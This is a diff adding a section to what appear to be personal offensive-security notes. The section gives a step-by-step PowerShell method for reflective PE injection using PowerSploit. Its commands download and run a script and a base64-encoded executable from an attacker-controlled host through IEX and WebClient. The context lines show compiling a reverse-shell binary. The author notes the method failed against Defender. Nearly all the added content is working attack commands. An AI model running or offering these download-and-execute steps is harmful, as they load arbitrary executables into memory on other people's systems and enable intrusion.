@@ -437,3 +437,31 @@ int main(int argc, char **argv) {
 ```bash
 i686-w64-mingw32-g++ rev.cpp -o revcpp.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
+
+---
+
+## Reflective PE Injection: didn't work against defender (2/8/2022)
+### Source: [video by adam chester](https://www.youtube.com/watch?v=byMBx4q-vYo)
+
+### Step #1: obtain the `Invoke-RelfectivePEInjection.ps1` from [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) and inject it into memory:
+```powershell
+IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/Invoke-RelfectivePEInjection.ps1')
+```
+### Step #2: convert the exe to `base64`. here's how it can be done using PowerShell:
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('path\to\exe')) > exe.bin
+```
+### Step #3: retrive the base64 and store it in a variable
+```powershell
+$b = IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/exe.bin')
+```
+### Step #4: get the binary back from base64 format and save it into a variable
+```powershell
+$c = [System.Convert]::FromBase64String($b)
+```
+### Step #5: call `Invoke-RelfectivePEInjection` and specify the flag `-PEBytes` with the `$c` variable as an argument
+```powershell
+Invoke-RelfectivePEInjection -PEBytes $c
+```
+
+---
